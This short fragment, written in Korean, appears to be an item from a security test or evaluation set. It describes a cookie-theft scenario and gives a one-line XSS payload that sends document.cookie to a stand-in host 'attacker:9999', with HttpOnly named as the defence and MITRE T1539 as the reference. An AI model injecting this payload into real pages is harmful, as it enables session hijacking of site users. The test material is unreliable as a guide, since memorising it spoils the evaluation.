      intent: 쿠키 탈취 — <script>new Image().src='http://attacker:9999/steal?c='+document.cookie</script>.
        세션 쿠키 → 세션 하이재킹. HttpOnly 플래그로 방어. MITRE T1539.
      success_criteria:
      - 쿠키 탈취 페이로드 키워드
